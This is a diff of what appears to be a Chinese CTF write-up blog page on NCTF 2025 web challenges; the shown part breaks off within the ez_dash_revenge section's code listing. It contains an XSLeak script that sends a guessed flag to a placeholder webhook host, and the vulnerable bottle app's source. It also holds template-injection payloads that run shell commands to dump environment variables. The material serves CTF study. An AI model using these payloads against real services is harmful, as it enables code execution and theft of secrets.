@@ -10,10 +10,9 @@
 <meta property='og:description' content="web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 &lt;script&gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = &#34;http://127.0.0.1:8000/internal/search?s=&#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(&#39;script&#39;) // 创建&lt;script&gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =&gt; { // 脚本加载成功时触发 fetch(&#34;http://yourwebhook/?flag=&#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =&gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = &#39;abcdefghijklmnopqrstuvwxyz0123456789-}&#39; // 猜测字符范围（包含闭合符}） let flag = &#39;flag{&#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i &lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } &lt;/script&gt; 每次运行爆出一位，然后手动在let flag = &lsquo;flag{&lsquo;后加上即可\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-nctf-web/'>
 <meta property='og:site_name' content='罗铠鸿'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emoji' /><meta property='article:published_time' content='2025-03-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-26T00:00:00&#43;00:00'/><meta property='og:image' content='https://luo-kaihong.github.io/p/2025-nctf-web/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E6%B0%9B%E5%9B%B4%E6%84%9F-%E7%BE%8E%E5%A5%B3.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emoji' /><meta property='article:published_time' content='2025-03-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-26T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-nctf-web">
-<meta name="twitter:description" content="web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 &lt;script&gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = &#34;http://127.0.0.1:8000/internal/search?s=&#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(&#39;script&#39;) // 创建&lt;script&gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =&gt; { // 脚本加载成功时触发 fetch(&#34;http://yourwebhook/?flag=&#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =&gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = &#39;abcdefghijklmnopqrstuvwxyz0123456789-}&#39; // 猜测字符范围（包含闭合符}） let flag = &#39;flag{&#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i &lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } &lt;/script&gt; 每次运行爆出一位，然后手动在let flag = &lsquo;flag{&lsquo;后加上即可\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://luo-kaihong.github.io/p/2025-nctf-web/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E6%B0%9B%E5%9B%B4%E6%84%9F-%E7%BE%8E%E5%A5%B3.png' />
+<meta name="twitter:description" content="web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 &lt;script&gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = &#34;http://127.0.0.1:8000/internal/search?s=&#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(&#39;script&#39;) // 创建&lt;script&gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =&gt; { // 脚本加载成功时触发 fetch(&#34;http://yourwebhook/?flag=&#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =&gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = &#39;abcdefghijklmnopqrstuvwxyz0123456789-}&#39; // 猜测字符范围（包含闭合符}） let flag = &#39;flag{&#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i &lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } &lt;/script&gt; 每次运行爆出一位，然后手动在let flag = &lsquo;flag{&lsquo;后加上即可\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -284,7 +283,13 @@
   <ol>
     <li><a href="#internal_api">internal_api</a></li>
     <li><a href="#sqlmap-master">sqlmap-master</a></li>
-    <li><a href="#ez_dash">ez_dash</a></li>
+    <li><a href="#ez_dash">ez_dash</a>
+      <ol>
+        <li><a href="#解法一">解法一</a></li>
+        <li><a href="#解法二打abort无回显">解法二：打abort无回显</a></li>
+      </ol>
+    </li>
+    <li><a href="#ez_dash_revenge">ez_dash_revenge</a></li>
   </ol>
 </nav>
         </div>
@@ -296,35 +301,19 @@
 
 
             <main class="main full-width">
-    <article class="has-image main-article">
+    <article class="main-article">
     <header class="article-header">
-        <div class="article-image">
-            <a href="/p/2025-nctf-web/">
-                <img src="/p/2025-nctf-web/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E6%B0%9B%E5%9B%B4%E6%84%9F-%E7%BE%8E%E5%A5%B3_hu_cf564ed53bd9ad7b.png"
-                        srcset="/p/2025-nctf-web/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E6%B0%9B%E5%9B%B4%E6%84%9F-%E7%BE%8E%E5%A5%B3_hu_cf564ed53bd9ad7b.png 800w, /p/2025-nctf-web/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E6%B0%9B%E5%9B%B4%E6%84%9F-%E7%BE%8E%E5%A5%B3_hu_a41945721ed0976b.png 1600w"
-                        width="800" 
-                        height="533" 
-                        loading="lazy"
-                        alt="Featured image of post 2025-nctf-web" />
-                
-            </a>
-        </div>
-    
 
     <div class="article-details">
     
     <header class="article-category">
         
-            <a href="/categories/write.up/" >
-                Write.up
+            <a href="/categories/write.up/" style="background-color: #2a9d8f; color: #fff;">
+                write.up
             </a>
         
-            <a href="/categories/web/" >
-                Web
-            </a>
-        
-            <a href="/categories/misc/" >
-                Misc
+            <a href="/categories/web/" style="background-color: #2a9d8f; color: #fff;">
+                web
             </a>
         
     </header>
@@ -369,7 +358,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 10 分钟
                 </time>
             </div>
         
@@ -547,8 +536,6 @@
 	srcset="/p/2025-nctf-web/image-20250326000155616_hu_966197563ccef382.png 480w, /p/2025-nctf-web/image-20250326000155616_hu_a83abe566cd3ed8c.png 1024w"
 	loading="lazy"
 	
-		alt="image-20250326000155616"
-	
 	
 		class="gallery-image" 
 		data-flex-grow="398"
@@ -556,8 +543,605 @@
 	
 ></p>
 <h2 id="ez_dash">ez_dash
-</h2><h1 id="misc">misc
-</h1>
+</h2><p>审计代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 提示信息：Flag在环境变量中，这可能意味着代码中存在某种漏洞，可以通过漏洞获取环境变量中的Flag值。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Optional</span>  <span class="c1"># 导入Optional类型，用于类型注解</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pydash</span>  <span class="c1"># 导入pydash模块，用于操作对象属性</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">bottle</span>  <span class="c1"># 导入bottle框架，用于创建Web服务器</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义一个包含禁止访问的属性路径的列表，这些路径通常是Python对象的内部属性，防止用户通过这些路径篡改对象内部结构。</span>
+</span></span><span class="line"><span class="cl"><span class="n">__forbidden_path__</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;__annotations__&#39;</span><span class="p">,</span> <span class="s1">&#39;__call__&#39;</span><span class="p">,</span> <span class="s1">&#39;__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;__closure__&#39;</span><span class="p">,</span> <span class="s1">&#39;__code__&#39;</span><span class="p">,</span> <span class="s1">&#39;__defaults__&#39;</span><span class="p">,</span> <span class="s1">&#39;__delattr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__dict__&#39;</span><span class="p">,</span> <span class="s1">&#39;__dir__&#39;</span><span class="p">,</span> <span class="s1">&#39;__doc__&#39;</span><span class="p">,</span> <span class="s1">&#39;__eq__&#39;</span><span class="p">,</span> <span class="s1">&#39;__format__&#39;</span><span class="p">,</span> <span class="s1">&#39;__ge__&#39;</span><span class="p">,</span> <span class="s1">&#39;__get__&#39;</span><span class="p">,</span> <span class="s1">&#39;__getattribute__&#39;</span><span class="p">,</span> <span class="s1">&#39;__gt__&#39;</span><span class="p">,</span> <span class="s1">&#39;__hash__&#39;</span><span class="p">,</span> <span class="s1">&#39;__init__&#39;</span><span class="p">,</span> <span class="s1">&#39;__init_subclass__&#39;</span><span class="p">,</span> <span class="s1">&#39;__kwdefaults__&#39;</span><span class="p">,</span> <span class="s1">&#39;__le__&#39;</span><span class="p">,</span> <span class="s1">&#39;__lt__&#39;</span><span class="p">,</span> <span class="s1">&#39;__module__&#39;</span><span class="p">,</span> <span class="s1">&#39;__name__&#39;</span><span class="p">,</span> <span class="s1">&#39;__ne__&#39;</span><span class="p">,</span> <span class="s1">&#39;__new__&#39;</span><span class="p">,</span> <span class="s1">&#39;__qualname__&#39;</span><span class="p">,</span> <span class="s1">&#39;__reduce__&#39;</span><span class="p">,</span> <span class="s1">&#39;__reduce_ex__&#39;</span><span class="p">,</span> <span class="s1">&#39;__repr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__setattr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__sizeof__&#39;</span><span class="p">,</span> <span class="s1">&#39;__str__&#39;</span><span class="p">,</span> <span class="s1">&#39;__subclasshook__&#39;</span><span class="p">,</span> <span class="s1">&#39;__wrapped__&#39;</span><span class="p">,</span> <span class="s2">&#34;Optional&#34;</span><span class="p">,</span> <span class="s2">&#34;func&#34;</span><span class="p">,</span> <span class="s2">&#34;render&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义一个包含禁止访问的名称的列表，初始时包含&#34;bottle&#34;，防止用户直接操作bottle模块。</span>
+</span></span><span class="line"><span class="cl"><span class="n">__forbidden_name__</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;bottle&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 将内置模块中的所有属性名称添加到禁止访问的名称列表中，防止用户通过内置模块进行危险操作。</span>
+</span></span><span class="line"><span class="cl"><span class="n">__forbidden_name__</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">dir</span><span class="p">(</span><span class="nb">globals</span><span class="p">()[</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义一个函数setval，用于设置指定对象的属性值。</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">setval</span><span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span> <span class="n">value</span><span class="p">:</span><span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">bool</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果名称中包含双下划线（__），直接返回False，防止用户访问Python的特殊方法或属性。</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">name</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;__&#34;</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 遍历禁止访问的名称列表，如果名称在列表中，返回False。</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">__forbidden_name__</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">name</span><span class="o">==</span><span class="n">word</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 遍历禁止访问的路径列表，如果路径中包含列表中的内容，返回False。</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">__forbidden_path__</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">path</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">word</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 从全局变量中获取指定名称的对象。</span>
+</span></span><span class="line"><span class="cl">    <span class="n">obj</span><span class="o">=</span><span class="nb">globals</span><span class="p">()[</span><span class="n">name</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 使用pydash模块的set_方法设置对象的属性值。</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 如果设置失败，返回False。</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果设置成功，返回True。</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义一个bottle的POST路由/setValue，用于接收用户请求并调用setval函数设置属性值。</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@bottle.post</span><span class="p">(</span><span class="s1">&#39;/setValue&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_value</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 从请求的查询参数中获取对象名称。</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 从请求的JSON数据中获取属性路径。</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果路径不是字符串，返回&#34;no&#34;。</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;no&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果名称或路径长度超过限制，返回&#34;no&#34;。</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;no&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 从请求的JSON数据中获取属性值。</span>
+</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;value&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 调用setval函数设置属性值，根据返回值返回&#34;yes&#34;或&#34;no&#34;。</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;yes&#34;</span> <span class="k">if</span> <span class="n">setval</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="k">else</span> <span class="s2">&#34;no&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义一个bottle的GET路由/render，用于渲染模板。</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@bottle.get</span><span class="p">(</span><span class="s1">&#39;/render&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">render_template</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 从请求的查询参数中获取模板路径。</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果路径中包含&#34;{&#34;, &#34;}&#34;, &#34;.&#34;等字符，返回&#34;Hacker&#34;，防止用户通过模板注入攻击。</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">path</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;{&#34;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">path</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;}&#34;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">path</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Hacker&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 使用bottle的template方法渲染模板并返回结果。</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bottle</span><span class="o">.</span><span class="n">template</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 启动bottle服务器，监听0.0.0.0的8000端口。</span>
+</span></span><span class="line"><span class="cl"><span class="n">bottle</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="解法一">解法一
+</h3><p>这里没过滤%，所以在rende路由可以执行python代码（类似打ssti）,paylaod</p>
+<p>原型是<code>%eval(&quot;__import__('os').popen('env')&quot;)</code>但是过滤了点号，所以用chr(46)代替，然后也不能出现空格，<strong>然后render只能渲染文件，不能渲染字符串，所以要将env输入到一个文件中</strong>，所以最终pyload是</p>
+<p><code>%eval(&quot;__import__('os')&quot;%2bchr(46)%2b&quot;popen('env&gt;1')&quot;)</code></p>
+<p><img src="/p/2025-nctf-web/image-20250327221517012.png"
+	width="933"
+	height="284"
+	srcset="/p/2025-nctf-web/image-20250327221517012_hu_b162746b9864970a.png 480w, /p/2025-nctf-web/image-20250327221517012_hu_d6e436a5086d462f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="328"
+		data-flex-basis="788px"
+	
+></p>
+<p><img src="/p/2025-nctf-web/image-20250327221243276.png"
+	width="1263"
+	height="379"
+	srcset="/p/2025-nctf-web/image-20250327221243276_hu_3379ef8b09a87cdf.png 480w, /p/2025-nctf-web/image-20250327221243276_hu_8a41e623b03bdcf6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="333"
+		data-flex-basis="799px"
+	
+></p>
+<h3 id="解法二打abort无回显">解法二：打abort无回显
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;%%</span><span class="mi">20</span><span class="n">from</span><span class="o">%</span><span class="mi">20</span><span class="n">bottle</span><span class="o">%</span><span class="mi">20</span><span class="n">import</span><span class="o">%</span><span class="mi">20</span><span class="n">abort</span><span class="o">%</span><span class="mi">0</span><span class="n">afrom</span><span class="o">%</span><span class="mi">20</span><span class="n">subprocess</span><span class="o">%</span><span class="mi">20</span><span class="n">import</span><span class="o">%</span><span class="mi">20</span><span class="n">getoutput</span><span class="o">%</span><span class="mi">0</span><span class="n">aa</span><span class="o">=</span><span class="n">getoutput</span><span class="p">(</span><span class="s2">&#34;env&#34;</span><span class="p">)</span><span class="o">%</span><span class="mi">0</span><span class="n">aabort</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="o">%&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>写成代码形式可能看得懂一点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># 从bottle库中导入abort函数，用于发送HTTP错误响应
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">from</span> <span class="nx">bottle</span> <span class="nx">import</span> <span class="nx">abort</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 从subprocess库中导入getoutput函数，用于执行系统命令并获取输出
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">from</span> <span class="nx">subprocess</span> <span class="nx">import</span> <span class="nx">getoutput</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 执行系统命令&#34;env&#34;，该命令用于列出当前环境变量，并将输出存储在变量a中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">a</span> <span class="o">=</span> <span class="nx">getoutput</span><span class="p">(</span><span class="s2">&#34;env&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用abort函数发送一个404 HTTP错误响应，并将环境变量的输出作为错误消息返回
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-nctf-web/image-20250327225045622.png"
+	width="1252"
+	height="635"
+	srcset="/p/2025-nctf-web/image-20250327225045622_hu_4637e929c0b469aa.png 480w, /p/2025-nctf-web/image-20250327225045622_hu_691aa9431d5ba8cc.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="197"
+		data-flex-basis="473px"
+	
+></p>
+<h2 id="ez_dash_revenge">ez_dash_revenge
+</h2><p>此题过滤了%，所以无法打上面得非预期（其实上面也是考原型污染链）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
